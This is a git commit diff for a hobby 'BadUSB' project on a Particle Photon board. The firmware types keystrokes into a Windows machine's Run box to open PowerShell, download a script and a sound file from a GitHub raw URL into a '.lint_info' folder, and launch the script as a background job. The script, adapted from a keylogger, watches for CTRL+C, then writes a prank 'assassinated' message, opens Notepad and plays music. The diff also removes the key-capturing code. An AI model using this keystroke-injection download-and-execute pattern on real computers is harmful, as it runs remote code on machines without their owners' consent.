a1b5e2550a65a5fb6dd92d443aba49bab1700b52
liam-caching <astral@caltech.edu>
2022-04-19 23:27:59 -0700

    add music :)

--- src/particle-photon-badusb.ino
+++ src/particle-photon-badusb.ino
@@ -11,9 +11,9 @@ STARTUP(Keyboard.begin());
 
 void setup() {
 
-  String url = "https://www.munchkin.com/media/catalog/product/3/1/31001_white_hot_safety_bath_ducky.jpg";
+  String url = "https://raw.githubusercontent.com/astral-grayson/particle-photon-badusb/main/trap.ps1";
   // String file = "31001_white_hot_safety_bath_ducky.jpg";
-  String ride = "https://ia600209.us.archive.org/32/items/WagnerTheRideOfTheValkyries/WagnerTheRideOfTheValkyrieswww.keepvid.com.mp3";
+  String ride = "https://raw.githubusercontent.com/astral-grayson/particle-photon-badusb/main/ride.wav";
 
   // WIN+R to open Run
   Keyboard.press(KEY_LEFT_WINDOWS);
@@ -42,23 +42,17 @@ void setup() {
   // Run PowerShell command: save file at $url as $file and execute it
   // DANGEROUS AS FUCK COMMAND OBVIOUSLY BE CAREFUL WITH $url CONTENTS
   // Saves file to Users\$user filesystem root
-  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = 'trap.ps1'; $down.DownloadFile($url,$file); Start-Job -ScriptBlock { ./trap.ps1 }; exit;");
-  delay(200);
+  Keyboard.print("mkdir .lint_info; cd .lint_info");
+  Keyboard.click(KEY_RETURN);
+  delay(100);
+  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';");
+  Keyboard.print("$down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = 'trap.ps1'; $down.DownloadFile($url,$file);");
+  Keyboard.print("$ride = '" + ride +"'; $ride_file = 'ride.wav'; $down.DownloadFile($ride,$ride_file);");
+  delay(100);
+  Keyboard.click(KEY_RETURN);
+  Keyboard.print("Start-Job -ScriptBlock { ./trap.ps1 }");
   Keyboard.click(KEY_RETURN);
 
-  // Keyboard.println("Hello world!");
-
-  // // Type 'SHIFT+t', 'e', 's', 't', 'SPACE', '1', '2', '3', '.', '4', '0', 'ENTER'
-  // Keyboard.printf("%s %.2f\n", "Test", 123.4f);
-
-  // // Quickly press and release Ctrl-Alt-Delete
-  // Keyboard.click(KEY_DELETE, MOD_LCTRL | MOD_LALT);
-
-  // Press Ctrl, then Alt, then Delete and release them all
-  // Keyboard.press(KEY_LCTRL);
-  // Keyboard.press(KEY_LALT);
-  // Keyboard.press(KEY_DELETE);
-  // Keyboard.releaseAll();
 }
 
 void loop() {
--- trap.ps1
+++ trap.ps1
@@ -1,4 +1,8 @@
 #requires -Version 2
+
+# adapted from https://gist.github.com/dasgoll/7ca1c059dd3b3fbc7277 
+# but does NOT log captured input
+
 function Start-Trap($Path="$env:temp\message.txt") 
 {
   # Signatures for API Calls
@@ -21,10 +25,10 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   try
   {
-    Write-Host 'Listening for key presses. Press CTRL+M to see results.' -ForegroundColor Red
+    # Write-Host 'Listening for key presses. Press CTRL+M to see results.' -ForegroundColor Red
 
-    # create endless loop. When user presses CTRL+M, finally-block
-    # executes and shows the collected key presses
+    # create endless loop. When user presses CTRL+C, finally-block
+    # executes and executes trap
     while ($true) {
       Start-Sleep -Milliseconds 40
       
@@ -35,54 +39,21 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
         # is key pressed?
         # -32767 is ASCII CTRL+C code (C=67)
-        # We want CTRL+M: -3 27 77
         if ($state -eq -32767) {
-            # DO NOTHING with incorrect keys
 
             $env:UserName + ", you've been assassinated by Astral!" | Out-File -FilePath $Path
-            
-            
-        #   $null = [console]::CapsLock
-
-        #   # translate scan code to real code
-        #   $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-        #   # get keyboard state for virtual keys
-        #   $kbstate = New-Object Byte[] 256
-        #   $checkkbstate = $API::GetKeyboardState($kbstate)
-
-        #   # prepare a StringBuilder to receive input key
-        #   $mychar = New-Object -TypeName System.Text.StringBuilder
-
-        #   # translate virtual key
-        #   $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-        #   if ($success) 
-        #   {
-        #     # execute trap on pressing the t key
-        #     if ($mychar -eq 't') {
-
-        #     }
-        #     $exec = New-Object -com shell.application; 
-        #     $exec.shellexecute($PSScriptRoot + $file);
-        #     [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
-        #   }
+           
         }
       }
     }
   }
   finally
   {
-    # open logger file in Notepad
-    # notepad $Path
-    
     notepad $Path;
-
     Start-Job -ScriptBlock { $play = New-Object System.Media.SoundPlayer; $play.soundlocation = 'not_the_ride.wav'; $play.playsync() }
-    # $play.playsync();
   }
 }
 
 # records all key presses until script is aborted by pressing CTRL+C
-# will then open the file with collected key codes
+# we then display message and play the ride 
 Start-Trap
